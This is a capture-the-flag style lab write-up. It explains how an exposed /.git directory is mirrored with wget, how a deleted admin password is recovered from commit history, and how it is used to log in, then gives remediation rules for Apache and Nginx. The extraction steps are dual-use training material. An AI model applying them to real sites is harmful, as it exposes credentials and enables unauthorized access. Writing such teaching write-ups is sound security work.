# Information Disclosure in Version Control History

**Difficulty:** `PRACTITIONER` | **Category:** `Information Disclosure`

---

## 🎯 Lab Goal

Obtain the administrator password from version control history, log in to the admin panel, and delete the user "carlos".

---

## 📋 Lab Description

This lab discloses sensitive information through its version control history. The goal is to exploit this to obtain the administrator's password.

---

## 🔎 Reconnaissance

### Initial Enumeration

1. **Checked page source** → Nothing interesting
2. **Checked `/robots.txt`** → No useful information

### Git Directory Discovery

Attempted to access `/.git` directory:

```
https://[lab-id].web-security-academy.net/.git
```

**Result:** Successfully found an exposed `.git` directory with full repository structure!

```
Index of /.git
Name              Size
<branches>
description       73B
<hooks>
<info>
<refs>
HEAD              23B
config            157B
<objects>
index             225B
COMMIT_EDITMSG    34B
<logs>
```

---

## 🧪 Testing & Exploitation

### Step 1: Clone the Repository

Used `wget` to recursively download the entire `.git` repository:

```bash
wget -r https://[lab-id].web-security-academy.net/.git
```

### Step 2: Navigate to Downloaded Repository

```bash
cd [lab-id].web-security-academy.net/.git
ls
```

**Output:**
```
COMMIT_EDITMSG  config  description  HEAD  hooks  index  
index.html  info  logs  objects  refs
```

### Step 3: Examine Commit History

Viewed the Git logs to find suspicious commits:

```bash
cat logs/HEAD
```

**Output:**
```
0000000000000000000000000000000000000000 da081537479ece823870c88aff72a6946fa6fa38 Carlos Montoya <carlos@carlos-montoya.net> 1753553909 +0000   commit (initial): Add skeleton admin panel

da081537479ece823870c88aff72a6946fa6fa38 c4feaf7fbeadd37bfd3d79c37b33089c09fa150e Carlos Montoya <carlos@carlos-montoya.net> 1753553909 +0000   commit: Remove admin password from config
```

🚨 **Suspicious commit found:** "Remove admin password from config"

### Step 4: Inspect the Suspicious Commit

Used `git show` to view the changes in that commit:

```bash
git show c4feaf7fbeadd37bfd3d79c37b33089c09fa150e
```

**Output:**
```diff
commit c4feaf7fbeadd37bfd3d79c37b33089c09fa150e (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

diff --git a/admin.conf b/admin.conf
index 0754869..21d23f1 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1 +1 @@
-ADMIN_PASSWORD=mne5xocl1f8pkb7uql9f
+ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

💎 **Password discovered:** `mne5xocl1f8pkb7uql9f`

### Step 5: Admin Access

Logged in using the discovered credentials:

| Field | Value |
|-------|-------|
| Username | `administrator` |
| Password | `mne5xocl1f8pkb7uql9f` |

Successfully accessed admin panel and deleted user "carlos".

---

## 🚩 Solution

**Password:** `mne5xocl1f8pkb7uql9f`

---

## 💡 Key Takeaways

### Git History is Permanent
- Even "removed" data remains in Git history
- Developers often commit secrets then try to remove them
- The damage is already done once committed

### Common Mistakes
- Hard-coding credentials in config files
- Committing secrets "temporarily"
- Thinking deletion removes them from history
- Not using `.gitignore` properly

### Attack Vector
Exposed `.git` directories allow attackers to:
- Download entire repository history
- View all commits and changes
- Extract deleted sensitive data
- Analyze code for vulnerabilities

### Automated Tools
- **git-dumper**: Downloads exposed Git repositories
- **GitTools**: Suite of tools for Git exploitation
- **truffleHog**: Searches Git history for secrets

---

## 🛡️ Remediation

### Prevent Git Exposure

**Apache:**
```apache
<DirectoryMatch "^/.*/\.git/">
    Require all denied
</DirectoryMatch>
```

**Nginx:**
```nginx
location ~ /\.git {
    deny all;
}
```

### Handle Committed Secrets

If secrets were committed:
1. **Rotate all exposed credentials immediately**
2. Use `git-filter-branch` or `BFG Repo-Cleaner` to remove from history
3. Force push to remote (if applicable)
4. Notify security team

### Best Practices

- ✅ Use **environment variables** for secrets
- ✅ Implement **secret management systems** (HashiCorp Vault, AWS Secrets Manager)
- ✅ Configure proper `.gitignore` files
- ✅ Use **pre-commit hooks** to scan for secrets
- ✅ Enable **Git Guardian** or similar secret scanning
- ✅ Never commit secrets, even temporarily
- ✅ Regular security audits of repositories

---

**Status:** ✅ Solved
